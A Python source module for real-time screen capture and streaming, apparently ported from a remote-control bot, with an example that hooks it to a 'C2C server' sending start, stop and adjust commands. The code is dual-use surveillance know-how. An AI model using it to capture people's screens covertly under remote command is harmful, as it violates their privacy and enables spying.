#!/usr/bin/env python3
"""
Real-time Screen Streaming Module
Ported from control_computer/bot.py - removed Telegram dependencies
"""

import cv2
import numpy as np
import pyautogui
import asyncio
import time
import threading
from io import BytesIO
from base64 import b64encode, b64decode
import json
import logging
from typing import Optional, Callable, Dict, Any


class ScreenStreamer:
    """Real-time screen streaming with quality and FPS control"""
    
    def __init__(self, 
                 quality: int = 60, 
                 fps: int = 2, 
                 scale: int = 50,
                 callback: Optional[Callable] = None):
        """
        Initialize screen streamer
        
        Args:
            quality (int): JPEG quality (10-100)
            fps (int): Frames per second (1-10)
            scale (int): Scale percentage (10-100)
            callback (Callable): Callback function to send frame data
        """
        self.quality = max(10, min(100, quality))
        self.fps = max(1, min(10, fps))
        self.scale = max(10, min(100, scale))
        self.callback = callback
        
        self.is_streaming = False
        self.stream_thread = None
        self.frame_count = 0
        self.start_time = None
        
        self.logger = logging.getLogger(__name__)
        
        # Statistics
        self.stats = {
            'frames_sent': 0,
            'bytes_sent': 0,
            'avg_fps': 0,
            'avg_frame_size': 0,
            'total_time': 0
        }
        
    def set_quality(self, quality: int) -> None:
        """Set JPEG quality (10-100)"""
        self.quality = max(10, min(100, quality))
        self.logger.info(f"Quality set to {self.quality}%")
        
    def set_fps(self, fps: int) -> None:
        """Set frames per second (1-10)"""
        self.fps = max(1, min(10, fps))
        self.logger.info(f"FPS set to {self.fps}")
        
    def set_scale(self, scale: int) -> None:
        """Set scale percentage (10-100)"""
        self.scale = max(10, min(100, scale))
        self.logger.info(f"Scale set to {self.scale}%")
        
    def capture_frame(self) -> Optional[bytes]:
        """Capture a single frame"""
        try:
            # Take screenshot
            screenshot = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)
            
            # Resize according to scale
            if self.scale != 100:
                width = int(frame.shape[1] * self.scale / 100)
                height = int(frame.shape[0] * self.scale / 100)
                frame = cv2.resize(frame, (width, height))
            
            # Compress with quality setting
            encode_params = [cv2.IMWRITE_JPEG_QUALITY, self.quality]
            success, buffer = cv2.imencode('.jpg', frame, encode_params)
            
            if success:
                return buffer.tobytes()
            else:
                self.logger.error("Failed to encode frame")
                return None
                
        except Exception as e:
            self.logger.error(f"Error capturing frame: {e}")
            return None
            
    def start_streaming(self) -> bool:
        """Start streaming in a separate thread"""
        if self.is_streaming:
            self.logger.warning("Streaming already active")
            return False
            
        if not self.callback:
            self.logger.error("No callback function provided")
            return False
            
        self.is_streaming = True
        self.start_time = time.time()
        self.frame_count = 0
        
        self.stream_thread = threading.Thread(target=self._stream_loop, daemon=True)
        self.stream_thread.start()
        
        self.logger.info(f"Started streaming at {self.fps} FPS, quality {self.quality}%, scale {self.scale}%")
        return True
        
    def stop_streaming(self) -> Dict[str, Any]:
        """Stop streaming and return statistics"""
        if not self.is_streaming:
            self.logger.warning("Streaming not active")
            return self.stats
            
        self.is_streaming = False
        
        if self.stream_thread and self.stream_thread.is_alive():
            self.stream_thread.join(timeout=2)
            
        # Calculate final statistics
        if self.start_time:
            total_time = time.time() - self.start_time
            self.stats.update({
                'total_time': total_time,
                'avg_fps': self.frame_count / total_time if total_time > 0 else 0,
                'avg_frame_size': self.stats['bytes_sent'] / self.frame_count if self.frame_count > 0 else 0
            })
            
        self.logger.info(f"Stopped streaming. Stats: {self.stats}")
        return self.stats.copy()
        
    def _stream_loop(self) -> None:
        """Main streaming loop"""
        frame_interval = 1.0 / self.fps
        
        while self.is_streaming:
            frame_start = time.time()
            
            try:
                # Capture frame
                frame_data = self.capture_frame()
                
                if frame_data:
                    # Prepare frame info
                    frame_info = {
                        'type': 'screen_frame',
                        'timestamp': time.time(),
                        'frame_number': self.frame_count,
                        'quality': self.quality,
                        'fps': self.fps,
                        'scale': self.scale,
                        'size': len(frame_data),
                        'data': b64encode(frame_data).decode('utf-8')
                    }
                    
                    # Send via callback
                    if self.callback:
                        self.callback(frame_info)
                        
                    # Update statistics
                    self.frame_count += 1
                    self.stats['frames_sent'] += 1
                    self.stats['bytes_sent'] += len(frame_data)
                    
                else:
                    self.logger.warning("Failed to capture frame")
                    
            except Exception as e:
                self.logger.error(f"Error in stream loop: {e}")
                
            # Control FPS
            elapsed = time.time() - frame_start
            sleep_time = max(0, frame_interval - elapsed)
            
            if sleep_time > 0:
                time.sleep(sleep_time)
                
    def get_stats(self) -> Dict[str, Any]:
        """Get current streaming statistics"""
        current_stats = self.stats.copy()
        
        if self.is_streaming and self.start_time:
            elapsed = time.time() - self.start_time
            current_stats.update({
                'current_fps': self.frame_count / elapsed if elapsed > 0 else 0,
                'elapsed_time': elapsed,
                'is_streaming': True
            })
        else:
            current_stats['is_streaming'] = False
            
        return current_stats
        
    def adjust_quality(self, delta: int) -> int:
        """Adjust quality by delta amount"""
        old_quality = self.quality
        self.set_quality(self.quality + delta)
        return self.quality - old_quality
        
    def adjust_fps(self, delta: int) -> int:
        """Adjust FPS by delta amount"""
        old_fps = self.fps
        self.set_fps(self.fps + delta)
        return self.fps - old_fps
        
    def adjust_scale(self, delta: int) -> int:
        """Adjust scale by delta amount"""
        old_scale = self.scale
        self.set_scale(self.scale + delta)
        return self.scale - old_scale


class StreamingManager:
    """Manager for screen streaming operations"""
    
    def __init__(self, send_callback: Optional[Callable] = None):
        """
        Initialize streaming manager
        
        Args:
            send_callback: Function to send data to server/client
        """
        self.send_callback = send_callback
        self.streamer = None
        self.logger = logging.getLogger(__name__)
        
    def start_stream(self, 
                    quality: int = 60,
                    fps: int = 2,
                    scale: int = 50) -> Dict[str, Any]:
        """Start screen streaming"""
        try:
            if self.streamer and self.streamer.is_streaming:
                return {
                    'success': False,
                    'message': 'Streaming already active',
                    'stats': self.streamer.get_stats()
                }
                
            # Create new streamer
            self.streamer = ScreenStreamer(
                quality=quality,
                fps=fps,
                scale=scale,
                callback=self._frame_callback
            )
            
            # Start streaming
            success = self.streamer.start_streaming()
            
            if success:
                return {
                    'success': True,
                    'message': f'Started streaming at {fps} FPS, quality {quality}%',
                    'settings': {
                        'quality': quality,
                        'fps': fps,
                        'scale': scale
                    }
                }
            else:
                return {
                    'success': False,
                    'message': 'Failed to start streaming'
                }
                
        except Exception as e:
            self.logger.error(f"Error starting stream: {e}")
            return {
                'success': False,
                'message': f'Error: {str(e)}'
            }
            
    def stop_stream(self) -> Dict[str, Any]:
        """Stop screen streaming"""
        try:
            if not self.streamer or not self.streamer.is_streaming:
                return {
                    'success': False,
                    'message': 'No active streaming'
                }
                
            stats = self.streamer.stop_streaming()
            
            return {
                'success': True,
                'message': 'Streaming stopped',
                'final_stats': stats
            }
            
        except Exception as e:
            self.logger.error(f"Error stopping stream: {e}")
            return {
                'success': False,
                'message': f'Error: {str(e)}'
            }
            
    def adjust_settings(self, 
                       quality_delta: int = 0,
                       fps_delta: int = 0,
                       scale_delta: int = 0) -> Dict[str, Any]:
        """Adjust streaming settings on the fly"""
        try:
            if not self.streamer:
                return {
                    'success': False,
                    'message': 'No streamer instance'
                }
                
            changes = {}
            
            if quality_delta != 0:
                changes['quality'] = self.streamer.adjust_quality(quality_delta)
                
            if fps_delta != 0:
                changes['fps'] = self.streamer.adjust_fps(fps_delta)
                
            if scale_delta != 0:
                changes['scale'] = self.streamer.adjust_scale(scale_delta)
                
            return {
                'success': True,
                'message': 'Settings adjusted',
                'changes': changes,
                'current_settings': {
                    'quality': self.streamer.quality,
                    'fps': self.streamer.fps,
                    'scale': self.streamer.scale
                }
            }
            
        except Exception as e:
            self.logger.error(f"Error adjusting settings: {e}")
            return {
                'success': False,
                'message': f'Error: {str(e)}'
            }
            
    def get_status(self) -> Dict[str, Any]:
        """Get current streaming status"""
        if not self.streamer:
            return {
                'active': False,
                'message': 'No streamer instance'
            }
            
        stats = self.streamer.get_stats()
        
        return {
            'active': self.streamer.is_streaming,
            'settings': {
                'quality': self.streamer.quality,
                'fps': self.streamer.fps,
                'scale': self.streamer.scale
            },
            'stats': stats
        }
        
    def _frame_callback(self, frame_info: Dict[str, Any]) -> None:
        """Callback to handle captured frames"""
        try:
            if self.send_callback:
                # Send frame data via provided callback
                self.send_callback(frame_info)
            else:
                # Log frame info (for testing)
                self.logger.debug(f"Frame {frame_info['frame_number']}: {frame_info['size']} bytes")
                
        except Exception as e:
            self.logger.error(f"Error in frame callback: {e}")


# Example usage integration with C2C server
def integrate_with_c2c_server():
    """Example of how to integrate with C2C server"""
    
    def send_to_client(data):
        """Send data to connected client"""
        # This would integrate with your server's send mechanism
        print(f"Sending frame: {len(data['data'])} bytes")
        
    # Create streaming manager
    streaming_manager = StreamingManager(send_callback=send_to_client)
    
    # Commands that can be called from server
    def handle_streaming_command(command: str, params: Dict[str, Any] = None) -> Dict[str, Any]:
        """Handle streaming commands from C2C server"""
        params = params or {}
        
        if command == 'start_stream':
            return streaming_manager.start_stream(
                quality=params.get('quality', 60),
                fps=params.get('fps', 2),
                scale=params.get('scale', 50)
            )
            
        elif command == 'stop_stream':
            return streaming_manager.stop_stream()
            
        elif command == 'adjust_quality':
            return streaming_manager.adjust_settings(
                quality_delta=params.get('delta', 10)
            )
            
        elif command == 'adjust_fps':
            return streaming_manager.adjust_settings(
                fps_delta=params.get('delta', 1)
            )
            
        elif command == 'get_status':
            return streaming_manager.get_status()
            
        else:
            return {
                'success': False,
                'message': f'Unknown command: {command}'
            }
    
    return handle_streaming_command


if __name__ == "__main__":
    # Test the streaming module
    import sys
    
    def test_callback(frame_info):
        print(f"Frame {frame_info['frame_number']}: {frame_info['size']} bytes, "
              f"Quality: {frame_info['quality']}%, FPS: {frame_info['fps']}")
    
    # Create and test streamer
    streamer = ScreenStreamer(quality=70, fps=1, callback=test_callback)
    
    print("Starting test stream for 5 seconds...")
    streamer.start_streaming()
    
    time.sleep(5)
    
    print("Stopping stream...")
    stats = streamer.stop_streaming()
    print(f"Final stats: {stats}")